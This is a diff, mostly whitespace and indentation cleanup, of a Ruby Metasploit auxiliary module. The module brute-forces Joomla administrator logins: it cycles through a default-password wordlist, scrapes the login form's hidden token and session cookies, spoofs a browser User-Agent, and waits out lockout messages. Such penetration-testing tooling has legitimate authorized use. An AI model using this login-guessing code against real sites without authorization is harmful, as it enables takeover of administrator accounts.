@@ -37,12 +37,12 @@ class Metasploit3 < Msf::Auxiliary
           File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
         OptString.new('AUTH_URI', [ false, "The URI to authenticate against (default:auto)", "/administrator/index.php" ]),
         OptString.new('FORM_URI', [ false, "The FORM URI to authenticate against (default:auto)" , "/administrator"]),
-      	OptString.new('USER_VARIABLE', [ false, "The name of the variable for the user field", "username"]),
-      	OptString.new('PASS_VARIABLE', [ false, "The name of the variable for the password field" , "passwd"]),
-      	OptString.new('WORD_ERROR', [ false, "The word of message for detect that login fail","mod-login-username"]),
-      	OptString.new('WORD_ERROR_2', [ false, "Second option for the word of message for detect that login fail","login.html"]),
+        OptString.new('USER_VARIABLE', [ false, "The name of the variable for the user field", "username"]),
+        OptString.new('PASS_VARIABLE', [ false, "The name of the variable for the password field" , "passwd"]),
+        OptString.new('WORD_ERROR', [ false, "The word of message for detect that login fail","mod-login-username"]),
+        OptString.new('WORD_ERROR_2', [ false, "Second option for the word of message for detect that login fail","login.html"]),
         OptString.new('WORD_ERROR_DELAY', [ false, "The word of message for active the delay time" , "por favor intente de nuevo en un minuto"]),
-	      OptInt.new('TIME_DELAY', [false, 'The delay time ', 0]),
+        OptInt.new('TIME_DELAY', [false, 'The delay time ', 0]),
         OptString.new('REQUESTTYPE', [ false, "Use HTTP-GET or HTTP-PUT for Digest-Auth, PROPFIND for WebDAV (default:GET)", "POST" ]),
         OptString.new('UserAgent', [ true, 'The HTTP User-Agent sent in the request', 'Mozilla/5.0 (X11; Linux i686; rv:24.0) Gecko/20140319 Firefox/24.0 Iceweasel/24.4.0' ]),
       ], self.class)
@@ -109,8 +109,8 @@ class Metasploit3 < Msf::Auxiliary
     print_status("Attempting to login to #{target_url}")
 
     each_user_pass { |user, pass|
-      	datastore['REQUESTTYPE'] = time_delay
-	      do_login(user, pass)
+        datastore['REQUESTTYPE'] = time_delay
+        do_login(user, pass)
     }
   end
 
@@ -126,22 +126,22 @@ class Metasploit3 < Msf::Auxiliary
       return :next_user
     else
       vprint_error("#{target_url} - Failed to login as '#{user}'")
-    	if result == :delay
-		    print_status("Establishing one minute delay")
-		    userpass_sleep_interval_add
+      if result == :delay
+        print_status("Establishing one minute delay")
+        userpass_sleep_interval_add
       end
       return
     end
   end
 
   def do_http_login(user,pass)
-    
+
     @uri_mod = @uri
 
     if datastore['REQUESTTYPE'] == "GET"
 
-    	@uri_mod = "#{@uri}?username=#{user}&psd=#{pass}"
-        	
+      @uri_mod = "#{@uri}?username=#{user}&psd=#{pass}"
+
         begin
           response = send_request_cgi({
               'uri' => @uri_mod,
@@ -149,14 +149,14 @@ class Metasploit3 < Msf::Auxiliary
               'username' => user,
               'password' => pass
               })
-	        return response
-    	  rescue ::Rex::ConnectionError
-      		vprint_error("#{target_url} - Failed to connect to the web server")
-      		return nil
-    	end
+          return response
+        rescue ::Rex::ConnectionError
+          vprint_error("#{target_url} - Failed to connect to the web server")
+          return nil
+      end
     else
 
-  	  begin
+      begin
 
         user_var = datastore['USER_VARIABLE']
         pass_var = datastore['PASS_VARIABLE']
@@ -170,9 +170,9 @@ class Metasploit3 < Msf::Auxiliary
           indice = 0
           value_cookie = ""
           #print_status("Longitud : #{uid.length}")
-          uid.each do |val_uid| 
-          	value_cookie = value_cookie + "#{val_uid.strip}=#{cval[indice].strip};"
-          	indice = indice +1
+          uid.each do |val_uid|
+            value_cookie = value_cookie + "#{val_uid.strip}=#{cval[indice].strip};"
+            indice = indice +1
           end
           value_cookie = value_cookie
           print_status("Value of cookie ( #{value_cookie} ), Hidden ( #{hidden_value}=1 )")
@@ -190,18 +190,18 @@ class Metasploit3 < Msf::Auxiliary
             'method' => datastore['REQUESTTYPE'],
             'cookie' => "#{value_cookie}",
             'data' => data,
-            'headers' => 
-            	{
-              	'Content-Type'    => ctype,
-              	'Referer' => referer_var,
-              	'User-Agent' => datastore['UserAgent'],
-            	},
+            'headers' =>
+              {
+                'Content-Type'    => ctype,
+                'Referer' => referer_var,
+                'User-Agent' => datastore['UserAgent'],
+              },
           }, 30)
 
           vprint_status("First Response Code : #{response.code}")
 
           if (response.code == 301 or response.code == 302 or response.code == 303) and response.headers['Location']
-              
+
               path = response.headers['Location']
               print_status("Following redirect Response: #{path}")
 
@@ -209,18 +209,18 @@ class Metasploit3 < Msf::Auxiliary
                'uri'     => path,
                'method'  => 'GET',
                'cookie' => "#{value_cookie}",
-                	}, 30)
+                  }, 30)
           end
 
           return response
         else
           print_error("#{target_url} - Failed to get Cookies")
-        end  
+        end
         rescue ::Rex::ConnectionError
           vprint_error("#{target_url} - Failed to connect to the web server")
         return nil
-  	  end
-    end   
+      end
+    end
   end
 
   def determine_result(response)
@@ -229,19 +229,19 @@ class Metasploit3 < Msf::Auxiliary
     return :abort unless response.code
 
     if [200, 301, 302].include?(response.code)
-	
-      #print_status("Respuesta: #{response.headers}") 
-      #print_status("Respuesta Code: #{response.body}") 
 
-    	if response.to_s.include? datastore['WORD_ERROR_DELAY'] 
-     		return :delay
-    	else
-    		if response.to_s.include? datastore['WORD_ERROR'] or response.to_s.include? datastore['WORD_ERROR_2']
-    			return :fail
-    		else
-    			return :success
-    		end
-    	end
+      #print_status("Respuesta: #{response.headers}")
+      #print_status("Respuesta Code: #{response.body}")
+
+      if response.to_s.include? datastore['WORD_ERROR_DELAY']
+         return :delay
+      else
+        if response.to_s.include? datastore['WORD_ERROR'] or response.to_s.include? datastore['WORD_ERROR_2']
+          return :fail
+        else
+          return :success
+        end
+      end
     end
     return :fail
   end
@@ -252,7 +252,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def get_login_cookie
-    
+
     uri = normalize_uri(datastore['FORM_URI'])
     uid             = ''
     cval            = ''
@@ -270,32 +270,32 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     #print_status("respuesta Get login cookie: #{res.to_s}")
-    	
+
     if res and res.code == 200 and res.headers['Set-Cookie']
-      #Idetificar formulario login y obtener la variable de validacion de session de Joomla	
+      #Idetificar formulario login y obtener la variable de validacion de session de Joomla
       if res.body and res.body =~ /<form action=([^\>]+)\>(.*)<\/form>/mi
-	
-    		#form = res.body.split(/<form action=([^\>]+) id="login-form" class="form-inline"\>(.*)<\/form>/mi)
-    		form = res.body.split(/<form action=([^\>]+) method="post" id="form-login"\>(.*)<\/form>/mi)
-    		#print_status("#{form[1]}")
+
+        #form = res.body.split(/<form action=([^\>]+) id="login-form" class="form-inline"\>(.*)<\/form>/mi)
+        form = res.body.split(/<form action=([^\>]+) method="post" id="form-login"\>(.*)<\/form>/mi)
+        #print_status("#{form[1]}")
 
         if form.length == 1  #No es Joomla 2.5
           print_error("Testing Form Joomla 3.0")
           form = res.body.split(/<form action=([^\>]+) method="post" id="form-login" class="form-inline"\>(.*)<\/form>/mi)
         end
 
-    		if not form
-    			print_error("Joomla Form Not Found")
-    			form = res.body.split(/<form id="login-form" action=([^\>]+)\>(.*)<\/form>/mi)
-    		end
-  		
-    		input_hidden = form[2].split(/<input type="hidden"([^\>]+)\/>/mi)
-    		#print_status("Formulario Encontrado #{form[2]}")
-    		print_status("--------> Joomla Form Found <--------")
-    		#print_status("Campos Ocultos #{input_hidden[7]}")
-    		input_id = input_hidden[7].split("\"")
-    		#print_status("valor #{input_id[1]}")
-    		valor_input_id = input_id[1]
+        if not form
+          print_error("Joomla Form Not Found")
+          form = res.body.split(/<form id="login-form" action=([^\>]+)\>(.*)<\/form>/mi)
+        end
+
+        input_hidden = form[2].split(/<input type="hidden"([^\>]+)\/>/mi)
+        #print_status("Formulario Encontrado #{form[2]}")
+        print_status("--------> Joomla Form Found <--------")
+        #print_status("Campos Ocultos #{input_hidden[7]}")
+        input_id = input_hidden[7].split("\"")
+        #print_status("valor #{input_id[1]}")
+        valor_input_id = input_id[1]
       end
 
       #Get the name of the cookie variable Joomla
@@ -303,8 +303,8 @@ class Metasploit3 < Msf::Auxiliary
       cval = Array.new
       #print_status("cookie = #{res.headers['Set-Cookie']}")
       res.headers['Set-Cookie'].split(';').each {|c|
-          if c.split('=')[0].length > 10 
-	          uid.push(c.split('=')[0])
+          if c.split('=')[0].length > 10
+            uid.push(c.split('=')[0])
             cval.push(c.split('=')[1])
           end
       }
